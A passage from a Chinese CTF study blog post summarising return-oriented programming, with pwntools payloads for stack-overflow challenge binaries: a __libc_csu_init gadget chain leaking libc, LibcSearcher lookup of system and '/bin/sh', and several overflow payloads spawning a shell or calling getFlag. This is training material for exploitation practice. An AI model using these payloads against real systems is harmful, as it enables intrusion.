<pre><code>我们可以看到在0x4006a6地址处有一段我们可以控制rbx,rbp,r12,r13,r14,r15寄存器的代码，之后在地址0x400690处，可以通过三条mov指令间接地控制rdx, rsi,rdi寄存器。并且利用call    qword ptr [r12+rbx*8]执行任意代码。*这时候我们只要再将rbx的值赋值为0，再通过精心构造栈上的数据，我们就可以控制pc去调用我们想要调用的函数了（比如说write函数）。执行完call qword ptr [r12+rbx*8]之后，程序会对rbx+=1，然后对比rbp和rbx的值，如果相等就会继续向下执行并ret到我们想要继续执行的地址。所以为了让rbp和rbx的值相等，我们可以将rbp的值设置为1，因为之前已经将rbx的值设置为0了。大概思路就是这样，我们下来构造ROP链。

首先利用write函数leak函数__libc_start_main的地址
</code></pre><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#rbx  rbp  r12  r13  r14  r15  rdx=r13 rsi=r14 edi=r15</span></span><br><span class="line"><span class="comment">#write(rdi = edi =r15 =1,rsi = r14 = got_write, rdx = r13 =8)</span></span><br><span class="line">payload1 = <span class="string">'a'</span> * <span class="number">0x88</span></span><br><span class="line">payload1 += p64(<span class="number">0x4006a6</span>) + p64(<span class="number">0</span>) + p64(<span class="number">0</span>) + p64(<span class="number">1</span>) + p64(got_write) + p64(<span class="number">8</span>) + p64(libc_start_main_got) + p64(<span class="number">1</span>)</span><br><span class="line">payload1 += p64(<span class="number">0x400690</span>)</span><br><span class="line">payload1 += <span class="string">'a'</span> * <span class="number">56</span></span><br><span class="line">payload1 += p64(fun_addr)</span><br><span class="line"><span class="keyword">print</span> <span class="string">'******************sending payload1*****************'</span></span><br><span class="line">p.recvuntil(<span class="string">'Input:\n'</span>)</span><br><span class="line">p.send(payload1)</span><br><span class="line">main_addr = u64(p.recv(<span class="number">8</span>))</span><br><span class="line"><span class="keyword">print</span> <span class="string">'main_addr ==&gt; '</span> + hex(main_addr)</span><br></pre></td></tr></table></figure>
<pre><code>查询libc版本号，得到system和&quot;/bin/sh&quot;.
</code></pre><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">libc = LibcSearcher(<span class="string">"__libc_start_main"</span>, main_addr)</span><br><span class="line">system_addr = main_addr - libc.dump(<span class="string">'__libc_start_main'</span>) + libc.dump(<span class="string">'system'</span>)</span><br><span class="line">binsh_addr = main_addr - libc.dump(<span class="string">'__libc_start_main'</span>) + libc.dump(<span class="string">'str_bin_sh'</span>)</span><br></pre></td></tr></table></figure>
<pre><code>接下来就是简单的构造getshell的payload的，这时候只需要找一个“pop rdi;ret&quot;段就可以。
</code></pre><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">payload3 = <span class="string">'a'</span> * <span class="number">0x88</span></span><br><span class="line">payload3 += p64(<span class="number">0x4006b3</span>) + p64(binsh_addr) + p64(system_addr)</span><br></pre></td></tr></table></figure>
<pre><code>除此之外，还有一种思路就是反复利用__libc_csu_init()函数里面的gadget。可以构造payload2利用read函数将&quot;/bin/sh&quot;读进.bss段。甚至payload3也可以用这一段来实现，只是前两个payload的返回地址必须要是main函数，否则寄存器的值不对，程序流程不对达不到效果。
</code></pre><p>8、ROP_LEV8</p>
<pre><code>讲了这么多，来一个大杂烩检查一下效果是一个不错的选择。这一题就是一个大杂烩啊，满足你的所有可能尝试……
</code></pre><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> __<span class="function">cdecl <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> **argv, <span class="keyword">const</span> <span class="keyword">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  setbuf(<span class="built_in">stdin</span>, <span class="number">0</span>);</span><br><span class="line">  setbuf(<span class="built_in">stdout</span>, <span class="number">0</span>);</span><br><span class="line">  setbuf(<span class="built_in">stderr</span>, <span class="number">0</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"so, can you find flag?"</span>);</span><br><span class="line">  foo(<span class="number">305419896</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">int</span> __<span class="function">cdecl <span class="title">foo</span><span class="params">(<span class="keyword">int</span> a1)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> result; <span class="comment">// eax@1</span></span><br><span class="line">  <span class="keyword">char</span> s; <span class="comment">// [sp+Ch] [bp-1Ch]@1</span></span><br><span class="line"></span><br><span class="line">  gets(&amp;s);</span><br><span class="line">  result = <span class="built_in">puts</span>(&amp;s);                            <span class="comment">// 这里有一个输出记得处理</span></span><br><span class="line">  <span class="keyword">if</span> ( a1 == <span class="number">1633771873</span> )</span><br><span class="line">    result = getFlag();</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">getFlag</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> s; <span class="comment">// [sp+4h] [bp-34h]@1</span></span><br><span class="line">  FILE *stream; <span class="comment">// [sp+2Ch] [bp-Ch]@1</span></span><br><span class="line"></span><br><span class="line">  stream = fopen(<span class="string">"flag"</span>, <span class="string">"r"</span>);</span><br><span class="line">  fgets(&amp;s, <span class="number">25</span>, stream);</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">puts</span>(&amp;s);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<pre><code>简单分析一下，最显眼的莫过于getFlag函数，可以看出它是直接可以输出我们梦寐以求的flag的。怎么引导程序进入这个函数呢？

显然，我们可以将foo函数的参数更改为&quot;1633771873&quot;,使得if语句成立，自然执行getFlag函数。
</code></pre><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload = <span class="string">'a'</span> * (<span class="number">0x1c</span> + <span class="number">0x08</span>) + p32(<span class="number">1633771873</span>)</span><br></pre></td></tr></table></figure>
<pre><code>另外，作为pwn，当然要想到将ret覆盖为getFlag函数的地址这种操作。(事实证明都可行)。
</code></pre><p>还有没有别的可能呢？当然有！</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload = <span class="string">'a'</span> * (<span class="number">0x1c</span> + <span class="number">0x04</span>) + p32(<span class="number">0x804855B</span>)</span><br></pre></td></tr></table></figure>
<pre><code>想一想，既然我们可以覆盖foo函数原来的参数&quot;305419896&quot;为&quot;1633771873&quot;，为什么不可以，直接用foo函数的地址覆盖ret，自己传入参数&quot;1633771873&quot;来达到目的？
</code></pre><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload = <span class="string">'a'</span> * (<span class="number">0x1c</span> + <span class="number">0x04</span>) + p32(<span class="number">0x804859F</span>) + p32(<span class="number">0xabefefab</span>) + p32(<span class="number">1633771873</span>)</span><br></pre></td></tr></table></figure>
<pre><code>再想一下，还有没有别的利用方法呢？

我们到目前是都没用到system(&quot;/bin/sh&quot;)的，其实也是可行的。仍然是泄露一个地址，确定libc版本号，再用工具找出system和&quot;/bin/sh&quot;。构造payload就OK，方法同上。
</code></pre><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload = <span class="string">'a'</span> * (<span class="number">0x1c</span> + <span class="number">0x04</span>) + p32(system_addr) + p32(<span class="number">0xabefabef</span>) + p32(binsh_addr)</span><br></pre></td></tr></table></figure>
<pre><code>ROP的构造、利用，灵活度很高，前提是要掌握原理，必须清楚自己构造的payload会产生什么样的效果，为什么会有这样的效果。可能很多时候自己的payload没有达到预期的效果，反复查看exp却找不出什么问题。这时候利用gdb调试是很有必要的。

个人喜欢下面的调试方法，比较方便：
</code></pre><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">p = process(<span class="string">'./test'</span>)</span><br><span class="line"><span class="keyword">print</span> <span class="string">'pid'</span> + str(proc.pidof(p))</span><br><span class="line">raw_input(<span class="string">'attach me'</span>)</span><br></pre></td></tr></table></figure>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">在得到pid后，只需要再打开一个终端窗口，输入一下命令用gdb调试即可:</span><br></pre></td></tr></table></figure>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo gdb attach pid</span><br></pre></td></tr></table></figure>
<pre><code>至此，ROP入门专项就到这里了。

在这里，很有必要感谢学长学姐的帮助，从搭建平台，到练习过程中的悉心指导，学长学姐们真的用心了。
</code></pre>
      
    </div>
    <footer class="article-footer">
      <a data-url="http://yoursite.com/2018/11/21/ROP专项总结/" data-id="cjorg7gto000lt0tvz55qbgu4" class="article-share-link">Share</a>
      
      
  <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/pwn/">pwn</a></li></ul>

    </footer>
  </div>
  
    
<nav id="article-nav">
  
    <a href="/2018/11/21/PE--导入导出表/" id="article-nav-newer" class="article-nav-link-wrap">
      <strong class="article-nav-caption">Newer</strong>
      <div class="article-nav-title">
        
          PE 导入导出表
        
      </div>
    </a>
  
  
    <a href="/2018/11/21/锋芒不漏/" id="article-nav-older" class="article-nav-link-wrap">
      <strong class="article-nav-caption">Older</strong>
      <div class="article-nav-title">锋芒不漏</div>
    </a>
  
</nav>

  
</article>

</section>
        
          <aside id="sidebar">
  
    

  
    
  <div class="widget-wrap">
    <h3 class="widget-title">Tags</h3>
    <div class="widget">
      <ul class="tag-list"><li class="tag-list-item"><a class="tag-list-link" href="/tags/Security/">Security</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/acm-算法/">acm 算法</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/pwn/">pwn</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/reverse/">reverse</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/算法/">算法</a></li></ul>
    </div>
  </div>


  
    
  <div class="widget-wrap">
    <h3 class="widget-title">Tag Cloud</h3>
    <div class="widget tagcloud">
      <a href="/tags/Security/" style="font-size: 10px;">Security</a> <a href="/tags/acm-算法/" style="font-size: 15px;">acm 算法</a> <a href="/tags/pwn/" style="font-size: 10px;">pwn</a> <a href="/tags/reverse/" style="font-size: 20px;">reverse</a> <a href="/tags/算法/" style="font-size: 15px;">算法</a>
    </div>
  </div>

  
    
  <div class="widget-wrap">
    <h3 class="widget-title">Archives</h3>
    <div class="widget">
      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2018/11/">November 2018</a></li></ul>
    </div>
  </div>


  
    
  <div class="widget-wrap">
    <h3 class="widget-title">Recent Posts</h3>
    <div class="widget">
      <ul>
        
          <li>
            <a href="/2018/11/22/Mini-Horse/">Mini_Horse</a>
          </li>
        
          <li>
            <a href="/2018/11/21/hello-world/">Hello World</a>
          </li>
        
          <li>
            <a href="/2018/11/21/M的硬盘/">M的硬盘</a>
          </li>
        
          <li>
            <a href="/2018/11/21/PE--导入导出表/">PE 导入导出表</a>
          </li>
        
          <li>
            <a href="/2018/11/21/ROP专项总结/">ROP专项总结</a>
          </li>
        
      </ul>
    </div>
  </div>

  
</aside>
        
      </div>
      <footer id="footer">
  
  <div class="outer">
    <div id="footer-info" class="inner">
      &copy; 2018 treebacker<br>
      Powered by <a href="http://hexo.io/" target="_blank">Hexo</a>
    </div>
  </div>
</footer>
    </div>
    <nav id="mobile-nav">
  
    <a href="/" class="mobile-nav-link">Home</a>
  
    <a href="/archives" class="mobile-nav-link">Archives</a>
  
</nav>
    

<script src="//ajax.googleapis.com/ajax/libs/jquery/2.0.3/jquery.min.js"></script>


  <link rel="stylesheet" href="/fancybox/jquery.fancybox.css">
  <script src="/fancybox/jquery.fancybox.pack.js"></script>


<script src="/js/script.js"></script>



  </div>
</body>
</html>